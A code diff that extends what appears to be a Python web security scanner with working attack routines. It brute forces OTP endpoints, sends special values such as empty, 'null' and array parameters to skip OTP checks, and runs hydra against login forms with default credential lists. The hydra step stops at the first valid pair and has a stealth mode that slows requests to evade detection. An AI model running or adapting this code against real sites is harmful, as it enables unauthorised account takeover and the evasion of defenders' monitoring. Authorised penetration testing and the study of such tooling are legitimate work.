@@ -100,6 +100,106 @@ def twofa_bypass_scanner(url: str, login_url: str = "", username: str = "", pass
             })
             logger.add_log(tool_name, "WARNING", f"No 2FA rate limiting: {endpoint}")
 
+    # ── 2b. OTP Brute Force Patterns ──────────────────────────────────────────
+    logger.add_log(tool_name, "PROCESSING", "Testing OTP brute force patterns")
+    otp_patterns = [
+        # Sequential OTPs
+        ("otp", [f"{i:06d}" for i in range(10)]),
+        ("code", [f"{i:06d}" for i in range(10)]),
+        ("token", [f"{i:06d}" for i in range(10)]),
+        # Common OTPs
+        ("otp", ["000000", "111111", "123456", "654321", "12345678", "0000"]),
+        ("code", ["000000", "111111", "123456", "654321", "12345678", "0000"]),
+        # Short OTPs (4-digit)
+        ("otp", [f"{i:04d}" for i in range(10)]),
+        ("code", [f"{i:04d}" for i in range(10)]),
+    ]
+
+    for endpoint in found_endpoints[:1]:
+        if check_cancelled(logger): break
+        for param_name, otp_list in otp_patterns:
+            try:
+                rate_limiter.wait(domain)
+                # Send multiple OTPs rapidly
+                otp_responses = []
+                for otp in otp_list:
+                    try:
+                        rate_limiter.wait(domain)
+                        r = requests.post(
+                            endpoint,
+                            data={param_name: otp},
+                            timeout=3, verify=False
+                        )
+                        otp_responses.append({
+                            "otp": otp,
+                            "status": r.status_code,
+                            "length": len(r.text)
+                        })
+                    except Exception:
+                        pass
+
+                # Check for successful OTP (different response)
+                if otp_responses:
+                    base_status = otp_responses[0]["status"]
+                    base_length = otp_responses[0]["length"]
+                    for resp in otp_responses[1:]:
+                        if resp["status"] != base_status or abs(resp["length"] - base_length) > 50:
+                            findings["vulnerabilities"].append({
+                                "type": "OTP Brute Force Possible",
+                                "endpoint": endpoint,
+                                "evidence": f"OTP {resp['otp']} returned different response (status: {resp['status']}, length: {resp['length']})",
+                                "severity": "Critical",
+                                "impact": "OTP can be brute-forced — different responses for valid vs invalid OTPs"
+                            })
+                            logger.add_log(tool_name, "WARNING", f"OTP brute force possible: {resp['otp']}")
+                            break
+            except Exception:
+                pass
+
+    # ── 2c. OTP Bypass Techniques ─────────────────────────────────────────────
+    logger.add_log(tool_name, "PROCESSING", "Testing OTP bypass techniques")
+    bypass_techniques = [
+        # Empty OTP
+        ("otp", ""),
+        ("code", ""),
+        ("token", ""),
+        # Null OTP
+        ("otp", "null"),
+        ("code", "null"),
+        # Undefined
+        ("otp", "undefined"),
+        ("code", "undefined"),
+        # Boolean
+        ("otp", "true"),
+        ("code", "true"),
+        # Array
+        ("otp[]", "123456"),
+        ("code[]", "123456"),
+    ]
+
+    for endpoint in found_endpoints[:1]:
+        if check_cancelled(logger): break
+        for param_name, otp_value in bypass_techniques:
+            try:
+                rate_limiter.wait(domain)
+                r = requests.post(
+                    endpoint,
+                    data={param_name: otp_value},
+                    timeout=3, verify=False
+                )
+                # Check if bypass worked (200 or redirect)
+                if r.status_code in [200, 302] and "error" not in r.text.lower():
+                    findings["vulnerabilities"].append({
+                        "type": "OTP Bypass via Special Value",
+                        "endpoint": endpoint,
+                        "evidence": f"OTP '{param_name}={otp_value}' accepted (status: {r.status_code})",
+                        "severity": "Critical",
+                        "impact": "OTP validation can be bypassed with special values"
+                    })
+                    logger.add_log(tool_name, "WARNING", f"OTP bypass: {param_name}={otp_value}")
+            except Exception:
+                pass
+
     # ── 3. 2FA skip/bypass check ──────────────────────────────────────────────
     logger.add_log(tool_name, "PROCESSING", "Testing 2FA bypass via direct navigation")
     # Kalau ada session, coba akses protected pages langsung tanpa complete 2FA
@@ -248,6 +348,96 @@ def credential_stuffing_scanner(url: str, login_url: str = "") -> str:
                 "length": len(r.content)
             })
         except Exception:
+            pass
+
+    total_time = _time.monotonic() - start_time
+    status_codes = [r["status"] for r in responses]
+    has_rate_limit = any(s in [429, 423, 503] for s in status_codes)
+    has_lockout = 403 in status_codes[5:]
+
+    if not has_rate_limit and not has_lockout and len(responses) >= 10:
+        findings["vulnerabilities"].append({
+            "type": "No Rate Limiting on Login",
+            "evidence": f"{len(responses)} attempts in {total_time:.1f}s, no lockout (status codes: {set(status_codes)})",
+            "severity": "High",
+            "impact": "Credential stuffing attacks possible — attacker can try millions of creds"
+        })
+        logger.add_log(tool_name, "WARNING", "No rate limiting on login endpoint!")
+
+    # ── 1b. HYDRA BRUTE FORCE TEST ───────────────────────────────────────────
+    if not has_rate_limit and not has_lockout:
+        logger.add_log(tool_name, "PROCESSING", "Running hydra for brute force test")
+        try:
+            import subprocess
+            import tempfile
+            import os
+
+            # Create temp files for usernames and passwords
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+                user_file = f.name
+                f.write("admin\nroot\ntest\nuser\n")
+
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+                pass_file = f.name
+                f.write("admin\npassword\n123456\nadmin123\nroot\ntest\n")
+
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+                output_file = f.name
+
+            # Determine login form fields
+            username_field = "username"
+            password_field = "password"
+
+            # Run hydra
+            cmd = [
+                "hydra",
+                "-L", user_file,
+                "-P", pass_file,
+                "-o", output_file,
+                "-f",  # Stop on first valid pair
+                "-t", "4",  # 4 threads
+                "-vV",  # Verbose
+                domain,
+                "http-post-form",
+                f"{login_endpoint}:{username_field}=^USER^:{password_field}=^PASS^:F=incorrect",
+            ]
+
+            # Apply stealth mode
+            if os.environ.get("STEALTH_MODE", "0") == "1":
+                cmd.extend(["-t", "1", "-w", "3"])
+
+            result = subprocess.run(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                timeout=60,
+            )
+
+            # Parse hydra output
+            output = result.stdout + result.stderr
+            if "login valid" in output.lower() or "password found" in output.lower():
+                findings["vulnerabilities"].append({
+                    "type": "Hydra Brute Force Success",
+                    "severity": "Critical",
+                    "evidence": "Hydra found valid credentials",
+                    "output": output[:500],
+                })
+                logger.add_log(tool_name, "WARNING", "Hydra found valid credentials!")
+
+            # Cleanup
+            for f in [user_file, pass_file, output_file]:
+                try:
+                    os.unlink(f)
+                except:
+                    pass
+
+        except subprocess.TimeoutExpired:
+            logger.add_log(tool_name, "WARNING", "Hydra timed out")
+        except FileNotFoundError:
+            logger.add_log(tool_name, "WARNING", "Hydra not found")
+        except Exception as e:
+            logger.add_log(tool_name, "WARNING", f"Hydra error: {str(e)[:100]}")
             pass
 
     total_time = _time.monotonic() - start_time
